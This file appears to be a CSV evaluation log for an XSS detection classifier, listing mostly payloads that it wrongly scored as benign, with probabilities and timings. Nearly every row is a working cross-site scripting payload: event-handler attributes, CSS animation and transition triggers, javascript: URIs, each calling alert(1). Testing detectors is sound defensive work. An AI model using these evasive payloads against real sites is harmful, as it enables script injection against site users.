payload,true_label,predicted_label,probabilities,inference_time_ms
<textarea onpointerdown=alert(1)>XSS</textarea>,1,0,"{'benign': 0.565, 'malicious': 0.435}",21.731799999997747
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",1,0,"{'benign': 0.5537, 'malicious': 0.4463}",24.668899999994665
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1,0,"{'benign': 0.5536, 'malicious': 0.4464}",25.13720000000319
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,1,0,"{'benign': 0.5667, 'malicious': 0.4333}",24.93320000000665
<textarea onchange=alert(1)>XSS</textarea>,1,0,"{'benign': 0.5823, 'malicious': 0.4177}",21.28240000000403
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",1,0,"{'benign': 0.5355, 'malicious': 0.4645}",19.845000000003665
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",1,0,"{'benign': 0.6001, 'malicious': 0.3999}",23.05749999999307
"<legend oncopy=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.5624, 'malicious': 0.4376}",21.78669999999272
<div id='mw-data-after-content'>,0,1,"{'benign': 0.4882, 'malicious': 0.5118}",17.239799999998695
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1,0,"{'benign': 0.5372, 'malicious': 0.4628}",22.24130000000457
"<label onkeydown=""alert(1)"" contenteditable>test</label>",1,0,"{'benign': 0.5698, 'malicious': 0.4302}",22.724199999998973
<time onpointerleave=alert(1)>XSS</time>,1,0,"{'benign': 0.6348, 'malicious': 0.3652}",17.815100000007078
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",1,0,"{'benign': 0.5352, 'malicious': 0.4648}",22.616099999993367
"<article onmouseup=""alert(1)"">test</article>",1,0,"{'benign': 0.5799, 'malicious': 0.4201}",20.001800000002845
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",1,0,"{'benign': 0.6642, 'malicious': 0.3358}",23.94010000000435
<head>,0,1,"{'benign': 0.471, 'malicious': 0.529}",19.88219999999785
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",1,0,"{'benign': 0.5626, 'malicious': 0.4374}",24.346800000003554
"<style onpaste=""alert(1)"" contenteditable>test</style>",1,0,"{'benign': 0.5753, 'malicious': 0.4247}",24.06080000000088
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",1,0,"{'benign': 0.6153, 'malicious': 0.3847}",23.862799999989193
"<tbody ondblclick=""alert(1)"">test</tbody>",1,0,"{'benign': 0.6264, 'malicious': 0.3736}",22.413100000008512
"<output onmousemove=""alert(1)"">test</output>",1,0,"{'benign': 0.5401, 'malicious': 0.4599}",18.858100000002764
"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></footer>",1,0,"{'benign': 0.5827, 'malicious': 0.4173}",37.67530000000363
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,1,0,"{'benign': 0.5402, 'malicious': 0.4598}",24.48119999999676
<col id=x tabindex=1 onactivate=alert(1)></col>,1,0,"{'benign': 0.5192, 'malicious': 0.4808}",23.90560000000619
<head id=x tabindex=1 onfocusin=alert(1)></head>,1,0,"{'benign': 0.5177, 'malicious': 0.4823}",22.41819999998995
<font onpointermove=alert(1)>XSS</font>,1,0,"{'benign': 0.5605, 'malicious': 0.4395}",21.760900000003858
<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>,1,0,"{'benign': 0.5631, 'malicious': 0.4369}",19.307299999994143
"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>",1,0,"{'benign': 0.6026, 'malicious': 0.3974}",20.356399999997166
"<ul onmouseout=""alert(1)"">test</ul>",1,0,"{'benign': 0.5598, 'malicious': 0.4402}",21.96070000000816
"<object onmouseup=""alert(1)"">test</object>",1,0,"{'benign': 0.5707, 'malicious': 0.4293}",27.538799999987873
"<object onkeyup=""alert(1)"" contenteditable>test</object>",1,0,"{'benign': 0.5748, 'malicious': 0.4252}",45.79379999999844
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,1,0,"{'benign': 0.5686, 'malicious': 0.4314}",59.12519999999688
"SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",1,0,"{'benign': 0.5823, 'malicious': 0.4177}",24.91849999999829
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",1,0,"{'benign': 0.6351, 'malicious': 0.3649}",30.83749999998986
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nobr>",1,0,"{'benign': 0.6064, 'malicious': 0.3936}",51.9043000000039
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",1,0,"{'benign': 0.5804, 'malicious': 0.4196}",22.65909999999849
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1,0,"{'benign': 0.5759, 'malicious': 0.4241}",24.450799999996775
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",1,0,"{'benign': 0.5986, 'malicious': 0.4014}",26.28509999999551
"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>",1,0,"{'benign': 0.6082, 'malicious': 0.3918}",24.178800000001388
<element onpointerdown=alert(1)>XSS</element>,1,0,"{'benign': 0.5511, 'malicious': 0.4489}",19.272600000007856
"<output onclick=""alert(1)"">test</output>",1,0,"{'benign': 0.5301, 'malicious': 0.4699}",17.105900000004226
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1,0,"{'benign': 0.5769, 'malicious': 0.4231}",32.88719999999046
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,1,0,"{'benign': 0.5388, 'malicious': 0.4612}",19.555999999994356
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,1,0,"{'benign': 0.5143, 'malicious': 0.4857}",23.02249999999617
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",1,0,"{'benign': 0.589, 'malicious': 0.411}",39.03830000000141
"<svg onmouseover=""alert(1)"">test</svg>",1,0,"{'benign': 0.5585, 'malicious': 0.4415}",22.712099999992574
"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>",1,0,"{'benign': 0.5368, 'malicious': 0.4632}",19.115200000001664
"<footer ondblclick=""alert(1)"">test</footer>",1,0,"{'benign': 0.5282, 'malicious': 0.4718}",20.932800000011298
"<center onkeyup=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.634, 'malicious': 0.366}",23.171500000003675
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",1,0,"{'benign': 0.5045, 'malicious': 0.4955}",22.90940000000319
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1,0,"{'benign': 0.6178, 'malicious': 0.3822}",18.04970000000594
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",1,0,"{'benign': 0.6126, 'malicious': 0.3874}",38.95719999999869
<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>,1,0,"{'benign': 0.5502, 'malicious': 0.4498}",24.19039999999484
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",1,0,"{'benign': 0.5726, 'malicious': 0.4274}",24.005799999997635
<time onpointerup=alert(1)>XSS</time>,1,0,"{'benign': 0.6404, 'malicious': 0.3596}",23.574099999990494
"<li oncontextmenu=""alert(1)"">test</li>",1,0,"{'benign': 0.5514, 'malicious': 0.4486}",22.53110000000902
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",1,0,"{'benign': 0.6019, 'malicious': 0.3981}",26.157600000004777
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",1,0,"{'benign': 0.5799, 'malicious': 0.4201}",31.823599999995622
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,1,0,"{'benign': 0.5415, 'malicious': 0.4585}",24.67919999999424
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",1,0,"{'benign': 0.5534, 'malicious': 0.4466}",28.482499999995525
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",1,0,"{'benign': 0.5948, 'malicious': 0.4052}",25.397499999996853
"<mark onmouseleave=""alert(1)"">test</mark>",1,0,"{'benign': 0.5464, 'malicious': 0.4536}",21.31939999999588
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",1,0,"{'benign': 0.6569, 'malicious': 0.3431}",20.943100000010872
"<output onkeydown=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5824, 'malicious': 0.4176}",24.073300000011955
"<sub onmousedown=""alert(1)"">test</sub>",1,0,"{'benign': 0.5886, 'malicious': 0.4114}",21.546599999993532
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",1,0,"{'benign': 0.5472, 'malicious': 0.4528}",29.213300000009212
javascript:alert(''),1,0,"{'benign': 0.6111, 'malicious': 0.3889}",18.095799999997553
"<aside onmouseup=""alert(1)"">test</aside>",1,0,"{'benign': 0.635, 'malicious': 0.365}",20.378100000002064
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",1,0,"{'benign': 0.6107, 'malicious': 0.3893}",29.2541999999969
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ul>",1,0,"{'benign': 0.5972, 'malicious': 0.4028}",51.963799999995786
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",1,0,"{'benign': 0.5624, 'malicious': 0.4376}",22.803700000011418
<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>,1,0,"{'benign': 0.5753, 'malicious': 0.4247}",23.654100000001677
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",1,0,"{'benign': 0.6132, 'malicious': 0.3868}",25.2241999999967
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",1,0,"{'benign': 0.576, 'malicious': 0.424}",28.735699999998587
<body id=x tabindex=1 onactivate=alert(1)></body>,1,0,"{'benign': 0.5108, 'malicious': 0.4892}",21.323100000003592
<td onpointerup=alert(1)>XSS</td>,1,0,"{'benign': 0.6045, 'malicious': 0.3955}",20.861600000003477
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>,1,0,"{'benign': 0.5436, 'malicious': 0.4564}",22.447199999987788
"<em onmouseenter=""alert(1)"">test</em>",1,0,"{'benign': 0.5892, 'malicious': 0.4108}",23.856300000005604
"<nav onbeforepaste=""alert(1)"" contenteditable>test</nav>",1,0,"{'benign': 0.592, 'malicious': 0.408}",22.58540000001119
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",1,0,"{'benign': 0.6418, 'malicious': 0.3582}",19.481999999996447
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",1,0,"{'benign': 0.5385, 'malicious': 0.4615}",23.275799999993296
		 </div> </div>,0,1,"{'benign': 0.4662, 'malicious': 0.5338}",17.973800000007145
"<td onkeypress=""alert(1)"" contenteditable>test</td>",1,0,"{'benign': 0.5912, 'malicious': 0.4088}",22.825300000008042
"<strike draggable=""true"" ondragenter=""alert(1)"">test</strike>",1,0,"{'benign': 0.5417, 'malicious': 0.4583}",23.342100000007804
"<i onbeforepaste=""alert(1)"" contenteditable>test</i>",1,0,"{'benign': 0.6313, 'malicious': 0.3687}",18.852200000011976
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",23.58049999999423
"<summary onmousemove=""alert(1)"">test</summary>",1,0,"{'benign': 0.5603, 'malicious': 0.4397}",20.360900000000015
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,1,0,"{'benign': 0.5591, 'malicious': 0.4409}",26.538099999996234
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ruby>",1,0,"{'benign': 0.589, 'malicious': 0.411}",44.96000000000322
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",1,0,"{'benign': 0.6065, 'malicious': 0.3935}",23.6689000000041
<plaintext onpointerout=alert(1)>XSS</plaintext>,1,0,"{'benign': 0.5725, 'malicious': 0.4275}",20.712700000004247
"<datalist onmousemove=""alert(1)"">test</datalist>",1,0,"{'benign': 0.593, 'malicious': 0.407}",21.39110000000244
"<time onkeyup=""alert(1)"" contenteditable>test</time>",1,0,"{'benign': 0.637, 'malicious': 0.363}",19.858800000008614
<textarea onpointerout=alert(1)>XSS</textarea>,1,0,"{'benign': 0.5726, 'malicious': 0.4274}",53.54379999999992
<input onpointerdown=alert(1)>XSS</input>,1,0,"{'benign': 0.5654, 'malicious': 0.4346}",19.996499999990647
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",1,0,"{'benign': 0.571, 'malicious': 0.429}",22.44920000001116
"<element oncontextmenu=""alert(1)"">test</element>",1,0,"{'benign': 0.5564, 'malicious': 0.4436}",20.051800000004505
<thead onpointerover=alert(1)>XSS</thead>,1,0,"{'benign': 0.5827, 'malicious': 0.4173}",22.083299999991368
"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>",1,0,"{'benign': 0.5668, 'malicious': 0.4332}",18.406299999995213
"<SCRIPT DEFER>alert("""")</SCRIPT>",1,0,"{'benign': 0.5843, 'malicious': 0.4157}",23.98789999999451
<svg onunload=window.open('javascript:alert(1)')>,1,0,"{'benign': 0.5517, 'malicious': 0.4483}",22.375900000000115
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>,1,0,"{'benign': 0.54, 'malicious': 0.46}",37.8509999999892
<thead id=x tabindex=1 onfocus=alert(1)></thead>,1,0,"{'benign': 0.5403, 'malicious': 0.4597}",32.89510000000462
<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>,1,0,"{'benign': 0.5443, 'malicious': 0.4557}",35.70460000000253
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",1,0,"{'benign': 0.6061, 'malicious': 0.3939}",52.16049999999939
"<details oncopy=""alert(1)"" contenteditable>test</details>",1,0,"{'benign': 0.6138, 'malicious': 0.3862}",21.306600000002618
<thead id=x tabindex=1 onfocusin=alert(1)></thead>,1,0,"{'benign': 0.5547, 'malicious': 0.4453}",24.789800000007745
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,1,0,"{'benign': 0.5303, 'malicious': 0.4697}",24.476700000008123
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",1,0,"{'benign': 0.5834, 'malicious': 0.4166}",23.01539999999136
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationend=""alert(1)""></bgsound>",1,0,"{'benign': 0.5837, 'malicious': 0.4163}",30.34990000000448
"<li onmouseup=""alert(1)"">test</li>",1,0,"{'benign': 0.5693, 'malicious': 0.4307}",23.738600000001497
"<multicol onclick=""alert(1)"">test</multicol>",1,0,"{'benign': 0.5913, 'malicious': 0.4087}",22.283799999996745
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",1,0,"{'benign': 0.62, 'malicious': 0.38}",23.787100000006944
"<a onmousemove=""alert(1)"">test</a>",1,0,"{'benign': 0.5655, 'malicious': 0.4345}",22.244800000009946
<figcaption onpointerenter=alert(1)>XSS</figcaption>,1,0,"{'benign': 0.5525, 'malicious': 0.4475}",22.286100000002307
"<cite onmouseleave=""alert(1)"">test</cite>",1,0,"{'benign': 0.5749, 'malicious': 0.4251}",21.049199999993107
<svg><ol onload=alert(1)></ol>,1,0,"{'benign': 0.5861, 'malicious': 0.4139}",18.859899999995378
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",1,0,"{'benign': 0.5188, 'malicious': 0.4812}",25.58019999999317
"<area onmousemove=""alert(1)"">test</area>",1,0,"{'benign': 0.5402, 'malicious': 0.4598}",24.11530000000539
"<table onmousedown=""alert(1)"">test</table>",1,0,"{'benign': 0.5047, 'malicious': 0.4953}",21.81660000000818
"<a ondblclick=""alert(1)"">test</a>",1,0,"{'benign': 0.5845, 'malicious': 0.4155}",22.38930000000039
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,0,"{'benign': 0.6528, 'malicious': 0.3472}",30.403899999996042
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",1,0,"{'benign': 0.5045, 'malicious': 0.4955}",24.288099999992596
"<audio onmouseup=""alert(1)"">test</audio>",1,0,"{'benign': 0.5903, 'malicious': 0.4097}",25.72310000000755
"<mark onmouseenter=""alert(1)"">test</mark>",1,0,"{'benign': 0.5277, 'malicious': 0.4723}",19.21680000000947
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",1,0,"{'benign': 0.5328, 'malicious': 0.4672}",24.08029999999428
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(1)""></output>",1,0,"{'benign': 0.5672, 'malicious': 0.4328}",25.970499999999674
"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",1,0,"{'benign': 0.6214, 'malicious': 0.3786}",16.677500000000123
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",1,0,"{'benign': 0.5763, 'malicious': 0.4237}",30.505999999988376
"<li onmousedown=""alert(1)"">test</li>",1,0,"{'benign': 0.5651, 'malicious': 0.4349}",21.372700000000577
"<iframe onmouseout=""alert(1)"">test</iframe>",1,0,"{'benign': 0.5317, 'malicious': 0.4683}",20.883900000001177
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dfn>",1,0,"{'benign': 0.6262, 'malicious': 0.3738}",51.49800000000937
"<nextid oncontextmenu=""alert(1)"">test</nextid>",1,0,"{'benign': 0.5549, 'malicious': 0.4451}",22.50180000000057
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationend=""alert(1)""></q>",1,0,"{'benign': 0.5289, 'malicious': 0.4711}",28.939100000002327
</div>,0,1,"{'benign': 0.4444, 'malicious': 0.5556}",17.27669999999648
"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",1,0,"{'benign': 0.6148, 'malicious': 0.3852}",29.066999999997734
<svg><main onload=alert(1)></main>,1,0,"{'benign': 0.5673, 'malicious': 0.4327}",21.743899999989935
<strong onpointerleave=alert(1)>XSS</strong>,1,0,"{'benign': 0.6037, 'malicious': 0.3963}",22.996000000006234
"<nextid ondblclick=""alert(1)"">test</nextid>",1,0,"{'benign': 0.5903, 'malicious': 0.4097}",19.72530000000461
<hr onpointerup=alert(1)>XSS</hr>,1,0,"{'benign': 0.6201, 'malicious': 0.3799}",18.214200000002734
"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frameset>",1,0,"{'benign': 0.5835, 'malicious': 0.4165}",33.262299999989864
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></data>",1,0,"{'benign': 0.586, 'malicious': 0.414}",48.21309999999812
